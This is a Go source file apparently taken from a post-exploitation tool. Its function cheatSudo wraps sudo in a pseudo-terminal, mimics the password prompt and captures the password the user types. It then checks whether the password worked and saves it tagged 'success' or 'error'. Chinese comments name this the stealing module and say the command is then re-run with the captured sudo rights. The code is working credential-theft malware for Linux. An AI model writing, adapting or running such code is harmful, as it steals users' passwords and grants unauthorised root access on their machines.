package main

import (
	"fmt"
	"github.com/google/goterm/term"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

var failAuthRE = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*:)|(重试)|(错误)|(try again)|( denied)`)
var SudoAskPrefix = regexp.MustCompile(`^\[sudo\]`)
var SudoAskEnd = regexp.MustCompile(`(: $)|(：$)`)

func cheatSudo() {
	var pty, _ = term.OpenPTY()
	var writeMsg = make(chan struct{})
	var password string
	var inputArgs []string
	var AskPass bool
	var readLock = make(chan struct{})
	//var IfSuccess bool

	suCmd := false
	for _, v := range os.Args[1:] {
		if v == "su" {
			suCmd = true
		}
	}
	if suCmd {
		inputArgs = []string{"-S", "-v"}
	} else {
		inputArgs = append([]string{"-S"}, os.Args[1:]...)
	}
	c := exec.Command("sudo", inputArgs...)
	c.Stdout = pty.Slave
	c.Stdin = pty.Slave
	c.Stderr = pty.Slave
	c.Start()
	go func() {
		for {
			<-writeMsg
			password = getPassword()
			pty.Master.WriteString(password + "\r\n")
		}

	}()
	var suffix string
	var lineByte []byte
	var line string
	go func() {
		for {
			v, err := pty.ReadByte()
			if err != nil || v == 0 {
				if suCmd && password != "" {
					writePassword(password + " success")
				} else if password != "" {
					writePassword(password + " error")
					password = ""
				}
				readLock <- struct{}{}
				return
			}
			lineByte = append(lineByte, v)
			line = string(lineByte)
			if len(string(lineByte)) <= 6 && len(suffix) <= 7 {
				suffix = string(lineByte)
			}

			//若命令无需询问密码,退出窃取模块
			if password == "" && len(suffix) == 6 && !SudoAskPrefix.MatchString(suffix) {
				readLock <- struct{}{}
				return
			}
			//逐行输出
			if (v == 13 || v == 10) && AskPass {
				fmt.Print(line)
				//判断密码是否正确
				if password != "" && strings.TrimSpace(line) != "" {
					if failAuthRE.MatchString(line) {
						writePassword(password + " error")
						password = ""
					} else {
						writePassword(password + " success")
						readLock <- struct{}{}
						return
					}
				}
				lineByte = nil
				line = ""
			}
			//询问密码语句输出
			if line != "" && SudoAskEnd.MatchString(line) && SudoAskPrefix.MatchString(line) {
				AskPass = true
				fmt.Print(line)
				//判断密码是否正确
				if password != "" && strings.TrimSpace(line) != "" {
					if failAuthRE.MatchString(line) {
						writePassword(password + " error")
						password = ""
					} else {
						//IfSuccess = true
						writePassword(password + " success")
						readLock <- struct{}{}
						return
					}
				}

				lineByte = nil
				line = ""
				writeMsg <- struct{}{}
				//去除输入的换行符
				pty.ReadByte()
				//pty.ReadByte()
			}

		}
	}()
	c.Wait()
	time.Sleep(time.Second / 2) //适配中文语言Linux环境的bug
	pty.Close()
	<-readLock

	if AskPass && password == "" {
		return
	}
	//窃取模块结束后利用sudo权限重新执行命令
	execScript(cmd)
}
